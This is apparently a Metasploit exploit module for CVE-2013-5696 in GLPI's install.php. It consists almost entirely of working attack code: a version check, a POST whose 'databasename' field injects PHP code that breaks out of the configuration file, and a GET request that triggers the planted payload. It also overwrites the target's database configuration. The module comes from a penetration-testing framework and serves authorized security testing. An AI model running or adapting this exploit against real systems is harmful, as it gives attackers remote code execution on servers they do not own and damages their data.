# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking # Application database configuration is overwritten

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;GLPI install.php Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an arbitrary command execution vulnerability in the
        GLPI &#039;install.php&#039; script. Users should use this exploit at his own risk,
        since it&#039;s going to overwrite database configuration.
      },
      &#039;Author&#039;         =>
        [
          &#039;Tristan Leiter < research[at]navixia.com >&#039;, # Navixia Research Team
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-5696&#039; ],
          [ &#039;URL&#039;, &#039;https://www.navixia.com/blog/entry/navixia-finds-critical-vulnerabilities-in-glpi-cve-2013-5696.html&#039; ],
          [ &#039;URL&#039;, &#039;http://www.glpi-project.org/forum/viewtopic.php?id=33762&#039; ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 4000,
          &#039;BadChars&#039;    => "#",
          &#039;DisableNops&#039; => true,
          &#039;Keys&#039;        => [&#039;php&#039;]
        },
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[ &#039;GLPI 0.84 or older&#039;, { }]],
      &#039;DisclosureDate&#039; => &#039;Sep 12 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to GLPI&#039;, &#039;/glpi/&#039;])
        ], self.class)
  end

  def uri
    return target_uri.path
  end

  def check
    # Check if the GLPI instance is vulnerable
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(uri, &#039;index.php&#039;),
    })

    if not res or res.code != 200
      return Exploit::CheckCode::Safe
    end

    re = &#039;(version)(\\s+)(.*)(\\s+)(Copyright)&#039;
    m = Regexp.new(re, Regexp::IGNORECASE)
    matched = m.match(res.body)
    if matched and matched[3] =~ /0.(8[0-4].[0-1])|([0-7][0-9].[0-9])/
      print_good("Detected Version : #{matched[3]}")
      return Exploit::CheckCode::Appears
    elsif matched
      print_error("Version #{matched[3]} is not vulnerable")
    end
    return Exploit::CheckCode::Safe

  end

  def exploit
    print_status("Injecting the payload...")
    rand_arg = Rex::Text.rand_text_hex(10)
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(uri, &#039;install/install.php&#039;),
      &#039;vars_post&#039; =>
      {
        &#039;install&#039;      => &#039;update_1&#039;,
        &#039;db_host&#039;      => &#039;localhost&#039;,
        &#039;db_user&#039;      => &#039;root&#039;,
        &#039;db_pass&#039;      => &#039;root&#039;,
        &#039;databasename&#039; =>"&#039;; } if(isset($_GET[&#039;#{rand_arg}&#039;])){ #{payload.encoded} } /*"
      }
    })

    unless res and res.code == 200 and res.body =~ /You will update the GLPI database/
      print_warning("Unexpected response while injecting the payload, trying to execute anyway...")
    end

    print_status("Executing the payload...")
    send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(uri, &#039;index.php&#039;),
      &#039;vars_get&#039;  =>
      {
        rand_arg => &#039;1&#039;,
      }
    })
  end

end

